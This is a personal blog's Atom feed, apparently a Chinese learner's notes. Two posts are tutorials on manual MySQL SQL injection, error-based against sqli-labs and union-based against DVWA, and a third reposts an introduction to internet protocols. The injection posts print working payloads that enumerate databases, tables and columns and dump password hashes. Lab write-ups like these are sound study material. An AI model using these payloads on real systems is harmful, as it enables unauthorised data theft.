<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Morn-zh.github.io</id>
    <title>Morn-zh</title>
    <updated>2021-04-14T15:31:14.779Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Morn-zh.github.io"/>
    <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
    <subtitle>我等着，等着你</subtitle>
    <logo>https://Morn-zh.github.io/images/avatar.png</logo>
    <icon>https://Morn-zh.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Morn-zh</rights>
    <entry>
        <title type="html"><![CDATA[MySQL⼿注之报错注⼊]]></title>
        <id>https://Morn-zh.github.io/post/mysqlzhu-zhi-bao-cuo-zhu/</id>
        <link href="https://Morn-zh.github.io/post/mysqlzhu-zhi-bao-cuo-zhu/">
        </link>
        <updated>2021-04-14T15:15:32.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql手注之报错注入">MySQL⼿注之报错注⼊</h1>
<blockquote>
<p>参考文章：https://blog.csdn.net/he_and/article/details/80455884</p>
<p>https://www.cnblogs.com/Triomphe/p/9489639.html（推荐）</p>
<p>Burp光标bug：https://www.cnblogs.com/bk76120/p/11167585.html</p>
</blockquote>
<h2 id="环境准备">环境准备</h2>
<p><a href="https://blog.csdn.net/qq_31910239/article/details/104508896">sqli-labs的安装过程中的报错</a></p>
<h2 id="报错语句构造">报错语句构造</h2>
<h3 id="1-count-rand-group-by">(1) count() , rand() , group by</h3>
<pre><code>select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;

select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
</code></pre>
<pre><code>mysql&gt; select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;  
ERROR 1062 (23000): Duplicate entry '::root@localhost::1' for key '&lt;group_key&gt;'
</code></pre>
<pre><code>mysql&gt; select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
ERROR 1062 (23000): Duplicate entry '5.7.311' for key '&lt;group_key&gt;'
</code></pre>
<ul>
<li>rand()函数会随机产生[0,1)之间的浮点数.</li>
<li>rand()函数可以自己设置随机种子,即rand(N),这个时候产生的随机数是伪随机数.也就是我们多次生成的是相同的.</li>
<li>floor(N)取整</li>
<li>concat()函数将字符串会将字符串拼接起来</li>
<li>group by a 会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组.（这里建立虚拟表的过程就是报错的原理所在）</li>
<li>count()计数</li>
</ul>
<h3 id="2-xml函数之extractvalue">(2) XML函数之ExtractValue()</h3>
<pre><code>select extractvalue(1,concat(0x7e,user(),0x7e))
</code></pre>
<pre><code>mysql&gt; select extractvalue(1,concat(0x7e,user(),0x7e));
ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
</code></pre>
<ul>
<li>
<p>ExtractValue(xml_str , Xpath) 函数,使用Xpath表示法从XML格式的字符串中提取一个值</p>
</li>
<li>
<p>ExtractValue()函数中任意一个参数为NULL,返回值都是NULL.</p>
<pre><code>mysql&gt; select extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;','/a/c');
+-----------------------------------------------------------------------+
| extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;','/a/c') |
+-----------------------------------------------------------------------+
| accc                                                                  |
+-----------------------------------------------------------------------+
</code></pre>
<pre><code>mysql&gt; select extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;',NULL);
+---------------------------------------------------------------------+
| extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;',NULL) |
+---------------------------------------------------------------------+
| NULL                                                                |
+---------------------------------------------------------------------+
</code></pre>
</li>
</ul>
<h3 id="3xml函数之updatexml">(3)XML函数之updatexml()</h3>
<pre><code>select updatexml(1,concat(0x7e,version(),0x7e),1) 
</code></pre>
<pre><code>mysql&gt; select updatexml(1,concat(0x7e,version(),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~5.7.31~'
</code></pre>
<h2 id="实践">实践</h2>
<h3 id="sqli-labs-less-17">sqli-labs Less-17</h3>
<p>关键性源码</p>
<pre><code>if($row)
{
    //echo '&lt;font color= &quot;#0000ff&quot;&gt;';	
    $row1 = $row['username'];  	
    //echo 'Your Login name:'. $row1;
    $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;;//数据库中执行的语句
    mysql_query($update);
    echo &quot;&lt;br&gt;&quot;;

    if (mysql_error())
    {
        echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;';
        print_r(mysql_error());
        echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;
        echo &quot;&lt;/font&gt;&quot;;
    }
    else
    {
        echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;';
        //echo &quot; You password has been successfully updated &quot; ;		
        echo &quot;&lt;br&gt;&quot;;
        echo &quot;&lt;/font&gt;&quot;;
    }

    echo '&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;';	//成功会显示slap1.jpg
    //echo 'Your Password:' .$row['password'];
    echo &quot;&lt;/font&gt;&quot;;



}
else  
{
    echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;';
    //echo &quot;Bug off you Silly Dumb hacker&quot;;
    echo &quot;&lt;/br&gt;&quot;;
    echo '&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;';//错误也会显示slap1.jpg
    echo &quot;&lt;/font&gt;&quot;;  
}
</code></pre>
<p>不管我们怎么输入最后返回结果都是一致的，所以我们试着用报错注入的方式看看，能不能返回我们需要的信息</p>
<p>这里补充下，源码中还对输入的信息进行了转义，后续的uname参数中的特殊字符都会被转义（那可以绕过不？）</p>
<h4 id="burp抓包进行修改">Burp抓包进行修改</h4>
<p>其中uname参数我们可以通过查看数据库（白盒测试）、查看源码、猜（布尔注入？）可以得到</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210414224913.png" alt="QQ截图20210414224913" loading="lazy"></figure>
<p>出现了转义，请教师傅后发现是<a href="https://blog.csdn.net/Xiaoxiaoqiang_/article/details/113763674">魔术引号</a>没关，关掉后重新发送</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210414224511.png" alt="QQ截图20210414224511" loading="lazy"></figure>
<p>成功~</p>
<p>这里如果没有关掉魔术引号，可以试试宽字符的方式绕过，具体怎么操作，后续补充</p>
<h2 id="总结">总结</h2>
<p>报错注入多用于无法获得回显点的情况下（盲注不好用的情况），使用mysql内置的几个函数之间的特殊性，让数据库将我们想要获得的信息同报错信息一起返回给我们</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MYSQL手注之联合注入]]></title>
        <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-lian-he-zhu-ru/</id>
        <link href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-lian-he-zhu-ru/">
        </link>
        <updated>2021-04-12T14:09:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql注入">MYSQL注入</h1>
<h2 id="dvwa安装">DVWA安装</h2>
<p><a href="http://cache.baiducontent.com/c?m=yOrLy9IADWBUcN5RdYdOeKF-9i5zGkd5wrXwyUNRLJ7HwsjsU4VnQBxzz_DHFUtngDwKmEqnUOS63GBeVZNvg9ekOpq1KD0aGgLwngRVVuWL3XtS9O8jOxjeSygKzUv6EC7NX3P_0NVpnvF953aVua&amp;p=8b2a97548f934eaf52b3c9204853&amp;newp=c4759a45dc8812a05afed46f574292695d0fc20e3addd401298ffe0cc4241a1a1a3aecbf2c241a05d7cf766d06aa4b5deff534703d0034f1f689df08d2ecce7e64&amp;s=1458e7509aa5f47e&amp;user=baidu&amp;fm=sc&amp;query=DVWA%B0%B2%D7%B0&amp;qid=9808245400017ec1&amp;p1=1">安装部署</a></p>
<p><a href="https://blog.51cto.com/taiji007/1738532">参考</a></p>
<h2 id="知识准备">知识准备</h2>
<h3 id="information_schema">information_schema</h3>
<p><u><strong>information_schema</strong></u>是MYSQL数据库生成时就存在的数据库，之后所有数据库、表的建立，都会在这个数据库中进行记录。</p>
<h4 id="information_schematables">information_schema.tables</h4>
<p><u><strong>tables</strong></u>是information_schema数据库中一个很重要的表格，其中记录了数据库中所有存在的表格信息。</p>
<p>包含以下字段：</p>
<ul>
<li>
<p>table_name：表名</p>
</li>
<li>
<p>table_schema：表所在数据库</p>
</li>
</ul>
<h4 id="information_schemacolumns">information_schema.columns</h4>
<p><u><strong>colunms</strong></u>是与tables表平行的一个表格，记录了所有的列名信息</p>
<p>包含以下字段：</p>
<ul>
<li>
<p>colunms_name：列名</p>
</li>
<li>
<p>table_name：表名</p>
</li>
<li>
<p>table_schema：表所在数据库</p>
</li>
</ul>
<h2 id="1-判断是否存在注入存在何种注入">1、判断是否存在注入，存在何种注入</h2>
<h2 id="2-猜表名">2、猜表名</h2>
<h2 id="3-猜列数">3、猜列数</h2>
<pre><code>order by 1;
order by 2;
……
order by n;
</code></pre>
<h2 id="4-猜列名">4、猜列名</h2>
<h2 id="5-联合查询">5、联合查询</h2>
<pre><code>union select
</code></pre>
<p>合并两次查询内容，前提是两者必须拥有同样的列数，且数据类型相同</p>
<pre><code>user：
username
password
id

news：
id
title
content

select * from news where id=1 union select username,password from user;
select * from news where id=1 union select 1,2,3 from user;
select * from news where id=1 union select 1,database(),3 from user;
</code></pre>
<h2 id="实践-1-dvwa">实践-1 DVWA</h2>
<h3 id="判断">判断</h3>
<p>输入</p>
<pre><code>'
</code></pre>
<p>返回：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <strong>'<u>'''</u>'</strong> at line 1</p>
<p>分析：去掉自带的两个单引号，还剩下<u><strong>'''</strong></u>，其中中间那个是我们输入的，则剩下的两个为sql语句中自带的</p>
<p>实际执行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = ''';
</code></pre>
<p>输入</p>
<pre><code>1' and '1'='1
</code></pre>
<p>源代码</p>
<pre><code>$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot; ;
</code></pre>
<p>输入后实际执行的</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' and '1' = '1';
</code></pre>
<p>这里使用字符型注入，用<u><strong>1'</strong></u>闭合前面的单引号，用<u><strong>’1</strong></u>闭合后面的单引号，并使and右边为True</p>
<p>如果是</p>
<pre><code>1' and 1=1
</code></pre>
<p>实际执行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1';
</code></pre>
<p>多出的未闭合的单引号会报错，无法运行</p>
<p>当然，注释掉最后的单引号也可以</p>
<blockquote>
<p>mysql中的注释符有哪些？</p>
<p>1、#...（单行注释）</p>
<p>2、&quot;-- &quot;，注意--后面有一个空格（单行注释）</p>
<p>3、/<em>...</em>/（多行注释）</p>
</blockquote>
<h3 id="猜列数">猜列数</h3>
<p>依次输入</p>
<pre><code>1' order by 1#
</code></pre>
<pre><code>1' order by 2#
</code></pre>
<pre><code>1' order by 3#
</code></pre>
<p>实际运行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' order by 3#';
</code></pre>
<p>报错</p>
<p>Unknown column '3' in 'order clause'</p>
<p>说明没有第3列，一共只有2列</p>
<h3 id="联合查找">联合查找</h3>
<h4 id="数据库名-用户名">数据库名、用户名</h4>
<p>输入</p>
<pre><code>1' union select 1,2#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select 1,2#
First name: admin
Surname: admin
ID: 1' union select 1,2#
First name: 1
Surname: 2
</code></pre>
<p>输入</p>
<pre><code>1' union select database(),user()#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select database(),user()#
First name: admin
Surname: admin
ID: 1' union select database(),user()#
First name: dvwa
Surname: dvwa@localhost
</code></pre>
<p>至此，得出数据库名为<u>dvwa</u>，用户名为<u>dvwa@localhost</u></p>
<p>以上实际运行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select database(),user()#';
</code></pre>
<h4 id="数据库版本和操作系统">数据库版本和操作系统</h4>
<p>输入</p>
<pre><code>1' union select version(),@@version_compile_os#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select version(),@@version_compile_os#
First name: admin
Surname: admin
ID: 1' union select version(),@@version_compile_os#
First name: 5.7.26
Surname: Win64
</code></pre>
<p>至此，得出数据库版本为<u>5.7.26</u>，操作系统为<u>Win64</u></p>
<p>其中，数据库版本需要注意，版本不同会影响后续的判断</p>
<p>当MySQL的版本⼩于4.0时，是不⽀持union select联合查询的；</p>
<p>当MySQL版本⼤于 5.0时，有个默认数据库<strong>information_schema</strong>，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 <strong>tables</strong> 的数据表，该表包含两个字段 <strong>table_name</strong> 和 <strong>table_schema</strong>，分别记录 DBMS 中的存储的<strong>表名</strong>和<strong>表名所在的数据库</strong>。</p>
<h3 id="获取表名">获取表名</h3>
<p>输入</p>
<pre><code>1' union select table_name,table_schema from information_schema.tables where
table_schema= 'dvwa'#
</code></pre>
<p>实际运行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#';
</code></pre>
<p>报错</p>
<pre><code>Illegal mix of collations for operation 'UNION'
</code></pre>
<p>原因：</p>
<p>前文说到union查询必须保证列数一样，还需要类型一致，原以为只是整型和字符的区别，没想到连<strong>编码</strong>都得一致</p>
<p>users表中的<strong>first_name</strong>, <strong>last_name</strong>字段都是<strong>utf_unicode_ci</strong>编码，而information_schema.tables表中的<strong>table_name</strong>,<strong>table_schema</strong>字段却是<strong>utf_general_ci</strong>编码</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/20210412_1.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/20210412_2.png" alt="" loading="lazy"></figure>
<p>没法，正常渗透过程中肯定不能让被攻击方自己把编码统一呀，只能从自己这边想办法</p>
<p>解决方法：</p>
<p>按照网上方法依葫芦画瓢</p>
<pre><code>1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
First name: admin
Surname: admin
ID: 1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
First name: 1
Surname: 6775657374626F6F6B7E647677612C75736572737E64767761
</code></pre>
<p>很明显结果为十六进制，不能解决我的问题</p>
<p>hex为转十六进制，那么尝试找找有没有十六进制转字符串的方法，unhex。</p>
<pre><code>1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
First name: admin
Surname: admin
ID: 1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
First name: 1
Surname: guestbook~dvwa,users~dvwa
</code></pre>
<p>到这都是用<u><strong>group_concat()</strong></u>将内容挤在一块，不好看，明明Ta给了两个位置，开始尝试另外的姿势</p>
<pre><code>1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
First name: admin
Surname: admin
ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
First name: guestbook
Surname: dvwa
ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
First name: users
Surname: dvwa
</code></pre>
<p>总结：编码既然不统一，那就让数据库自己解决，先hex再unhex，至于解码出来的是啥就看数据库咋想的了</p>
<p>当然为了后续的学习的方便，最后还是将编码统一了（删库重建</p>
<h3 id="获取列名">获取列名</h3>
<p>输入</p>
<pre><code>1' union select 1,group_concat(column_name) from information_schema.columns where
table_name='users' #
</code></pre>
<blockquote>
<p>group_concat()一次性列出</p>
<p>这里是一次性列出column_name</p>
</blockquote>
<p>返回</p>
<pre><code>ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
First name: admin
Surname: admin
ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
First name: 1
Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
</code></pre>
<h3 id="获取数据">获取数据</h3>
<p>输入</p>
<pre><code>1' union select user,password from users#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select user,password from users#
First name: admin
Surname: admin
ID: 1' union select user,password from users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 1' union select user,password from users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID: 1' union select user,password from users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 1' union select user,password from users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 1' union select user,password from users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
</code></pre>
<h3 id="总结">总结</h3>
<p>判断是否存在注入</p>
<pre><code>'
</code></pre>
<p>判断列数</p>
<pre><code>order by n
</code></pre>
<p>查询数据库名、当前用户名</p>
<pre><code>select database(),user()
</code></pre>
<p>查询数据库下的表名</p>
<pre><code>select table_name,table_schema from information_schema.tables where
table_schema= 'dvwa'
</code></pre>
<p>查询表中的列名</p>
<pre><code>select 1,group_concat(column_name) from information_schema.columns where
table_name='users'
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[（转载）互联网协议入门（二）]]></title>
        <id>https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-er/</id>
        <link href="https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-er/">
        </link>
        <updated>2020-11-24T11:34:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="互联网协议入门二">互联网协议入门（二）</h1>
<p><strong>七、一个小结</strong></p>
<p>先对前面的内容，做一个小结。</p>
<p>我们已经知道，网络通信就是交换数据包。电脑A向电脑B发送一个数据包，后者收到了，回复一个数据包，从而实现两台电脑之间的通信。数据包的结构，基本上是下面这样：</p>
<figure data-type="image" tabindex="1"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052913.png" alt="img" loading="lazy"></figure>
<p>发送这个包，需要知道两个地址：</p>
<blockquote>
<ul>
<li>
<p>对方的MAC地址</p>
</li>
<li>
<p>对方的IP地址</p>
</li>
</ul>
</blockquote>
<p>有了这两个地址，数据包才能准确送到接收者手中。但是，前面说过，MAC地址有局限性，如果两台电脑不在同一个子网络，就无法知道对方的MAC地址，必须通过网关（gateway）转发。</p>
<figure data-type="image" tabindex="2"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061101.jpg" alt="img" loading="lazy"></figure>
<p>上图中，1号电脑要向4号电脑发送一个数据包。它先判断4号电脑是否在同一个子网络，结果发现不是（后文介绍判断方法），于是就把这个数据包发到网关A。网关A通过路由协议，发现4号电脑位于子网络B，又把数据包发给网关B，网关B再转发到4号电脑。</p>
<p>1号电脑把数据包发到网关A，必须知道网关A的MAC地址。所以，数据包的目标地址，实际上分成两种情况：</p>
<table>
<thead>
<tr>
<th>场景</th>
<th>数据包地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>同一个子网络</td>
<td>对方的MAC地址，对方的IP地址</td>
</tr>
<tr>
<td>非同一个子网络</td>
<td>网关的MAC地址，对方的IP地址</td>
</tr>
</tbody>
</table>
<p>发送数据包之前，电脑必须判断对方是否在同一个子网络，然后选择相应的MAC地址。接下来，我们就来看，实际使用中，这个过程是怎么完成的。</p>
<p><strong>八、用户的上网设置</strong></p>
<p><strong>8.1 静态IP地址</strong></p>
<p>你买了一台新电脑，插上网线，开机，这时电脑能够上网吗？</p>
<figure data-type="image" tabindex="3"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061110.jpg" alt="img" loading="lazy"></figure>
<p>通常你必须做一些设置。有时，管理员（或者ISP）会告诉你下面四个参数，你把它们填入操作系统，计算机就能连上网了：</p>
<blockquote>
<ul>
<li>本机的IP地址</li>
<li>子网掩码</li>
<li>网关的IP地址</li>
<li>DNS的IP地址</li>
</ul>
</blockquote>
<p>下图是Windows系统的设置窗口。</p>
<figure data-type="image" tabindex="4"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061111.png" alt="img" loading="lazy"></figure>
<p>这四个参数缺一不可，后文会解释为什么需要知道它们才能上网。由于它们是给定的，计算机每次开机，都会分到同样的IP地址，所以这种情况被称作&quot;静态IP地址上网&quot;。</p>
<p>但是，这样的设置很专业，普通用户望而生畏，而且如果一台电脑的IP地址保持不变，其他电脑就不能使用这个地址，不够灵活。出于这两个原因，大多数用户使用&quot;动态IP地址上网&quot;。</p>
<p><strong>8.2 动态IP地址</strong></p>
<p>所谓&quot;动态IP地址&quot;，指计算机开机后，会自动分配到一个IP地址，不用人为设定。它使用的协议叫做<a href="http://zh.wikipedia.org/zh/DHCP">DHCP协议</a>。</p>
<p>这个协议规定，每一个子网络中，有一台计算机负责管理本网络的所有IP地址，它叫做&quot;DHCP服务器&quot;。新的计算机加入网络，必须向&quot;DHCP服务器&quot;发送一个&quot;DHCP请求&quot;数据包，申请IP地址和相关的网络参数。</p>
<p>前面说过，如果两台计算机在同一个子网络，必须知道对方的MAC地址和IP地址，才能发送数据包。但是，新加入的计算机不知道这两个地址，怎么发送数据包呢？</p>
<p>DHCP协议做了一些巧妙的规定。</p>
<p><strong>8.3 DHCP协议</strong></p>
<p>首先，它是一种应用层协议，建立在UDP协议之上，所以整个数据包是这样的：</p>
<figure data-type="image" tabindex="5"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061102.png" alt="img" loading="lazy"></figure>
<p>（1）最前面的&quot;以太网标头&quot;，设置发出方（本机）的MAC地址和接收方（DHCP服务器）的MAC地址。前者就是本机网卡的MAC地址，后者这时不知道，就填入一个广播地址：FF-FF-FF-FF-FF-FF。</p>
<p>（2）后面的&quot;IP标头&quot;，设置发出方的IP地址和接收方的IP地址。这时，对于这两者，本机都不知道。于是，发出方的IP地址就设为0.0.0.0，接收方的IP地址设为255.255.255.255。</p>
<p>（3）最后的&quot;UDP标头&quot;，设置发出方的端口和接收方的端口。这一部分是DHCP协议规定好的，发出方是68端口，接收方是67端口。</p>
<p>这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道&quot;这个包是发给我的&quot;，而其他计算机就可以丢弃这个包。</p>
<p>接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个&quot;DHCP响应&quot;数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。</p>
<p>新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数。</p>
<p><strong>8.4 上网设置：小结</strong></p>
<p>这个部分，需要记住的就是一点：不管是&quot;静态IP地址&quot;还是&quot;动态IP地址&quot;，电脑上网的首要步骤，是确定四个参数。这四个值很重要，值得重复一遍：</p>
<blockquote>
<ul>
<li>本机的IP地址</li>
<li>子网掩码</li>
<li>网关的IP地址</li>
<li>DNS的IP地址</li>
</ul>
</blockquote>
<p>有了这几个数值，电脑就可以上网&quot;冲浪&quot;了。接下来，我们来看一个实例，当用户访问网页的时候，互联网协议是怎么运作的。</p>
<p><strong>九、一个实例：访问网页</strong></p>
<p><strong>9.1 本机参数</strong></p>
<p>我们假定，经过上一节的步骤，用户设置好了自己的网络参数：</p>
<blockquote>
<ul>
<li>本机的IP地址：192.168.1.100</li>
<li>子网掩码：255.255.255.0</li>
<li>网关的IP地址：192.168.1.1</li>
<li>DNS的IP地址：8.8.8.8</li>
</ul>
</blockquote>
<p>然后他打开浏览器，想要访问Google，在地址栏输入了网址：www.google.com。</p>
<figure data-type="image" tabindex="6"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061103.png" alt="img" loading="lazy"></figure>
<p>这意味着，浏览器要向Google发送一个网页请求的数据包。</p>
<p><strong>9.2 DNS协议</strong></p>
<p>我们知道，发送数据包，必须要知道对方的IP地址。但是，现在，我们只知道网址www.google.com，不知道它的IP地址。</p>
<p><a href="http://en.wikipedia.org/wiki/Domain_Name_System">DNS协议</a>可以帮助我们，将这个网址转换成IP地址。已知DNS服务器为8.8.8.8，于是我们向这个地址发送一个DNS数据包（53端口）。</p>
<figure data-type="image" tabindex="7"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061105.png" alt="img" loading="lazy"></figure>
<p>然后，DNS服务器做出响应，告诉我们Google的IP地址是172.194.72.105。于是，我们知道了对方的IP地址。</p>
<p><strong>9.3 子网掩码</strong></p>
<p>接下来，我们要判断，这个IP地址是不是在同一个子网络，这就要用到子网掩码。</p>
<p>已知子网掩码是255.255.255.0，本机用它对自己的IP地址192.168.1.100，做一个二进制的AND运算（两个数位都为1，结果为1，否则为0），计算结果为192.168.1.0；然后对Google的IP地址172.194.72.105也做一个AND运算，计算结果为172.194.72.0。这两个结果不相等，所以结论是，Google与本机不在同一个子网络。</p>
<p>因此，我们要向Google发送数据包，必须通过网关192.168.1.1转发，也就是说，接收方的MAC地址将是网关的MAC地址。</p>
<p><strong>9.4 应用层协议</strong></p>
<p>浏览网页用的是HTTP协议，它的整个数据包构造是这样的：</p>
<figure data-type="image" tabindex="8"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061106.png" alt="img" loading="lazy"></figure>
<p>HTTP部分的内容，类似于下面这样：</p>
<blockquote>
<p>GET / HTTP/1.1<br>
　　Host: www.google.com<br>
　　Connection: keep-alive<br>
　　User-Agent: Mozilla/5.0 (Windows NT 6.1) ......<br>
　　Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>
　　Accept-Encoding: gzip,deflate,sdch<br>
　　Accept-Language: zh-CN,zh;q=0.8<br>
　　Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br>
　　Cookie: ... ...</p>
</blockquote>
<p>我们假定这个部分的长度为4960字节，它会被嵌在TCP数据包之中。</p>
<p><strong>9.5 TCP协议</strong></p>
<p>TCP数据包需要设置端口，接收方（Google）的HTTP端口默认是80，发送方（本机）的端口是一个随机生成的1024-65535之间的整数，假定为51775。</p>
<p>TCP数据包的标头长度为20字节，加上嵌入HTTP的数据包，总长度变为4980字节。</p>
<p><strong>9.6 IP协议</strong></p>
<p>然后，TCP数据包再嵌入IP数据包。IP数据包需要设置双方的IP地址，这是已知的，发送方是192.168.1.100（本机），接收方是172.194.72.105（Google）。</p>
<p>IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。</p>
<p><strong>9.7 以太网协议</strong></p>
<p>最后，IP数据包嵌入以太网数据包。以太网数据包需要设置双方的MAC地址，发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。</p>
<p>以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。</p>
<figure data-type="image" tabindex="9"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061107.png" alt="img" loading="lazy"></figure>
<p><strong>9.8 服务器端响应</strong></p>
<p>经过多个网关的转发，Google的服务器172.194.72.105，收到了这四个以太网数据包。</p>
<p>根据IP标头的序号，Google将四个包拼起来，取出完整的TCP数据包，然后读出里面的&quot;HTTP请求&quot;，接着做出&quot;HTTP响应&quot;，再用TCP协议发回来。</p>
<p>本机收到HTTP响应以后，就可以将网页显示出来，完成一次网络通信。</p>
<figure data-type="image" tabindex="10"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061104.jpg" alt="img" loading="lazy"></figure>
<p>这个例子就到此为止，虽然经过了简化，但它大致上反映了互联网协议的整个通信过程。</p>
<p>（完）</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[（转载）互联网协议入门（一）]]></title>
        <id>https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-yi/</id>
        <link href="https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-yi/">
        </link>
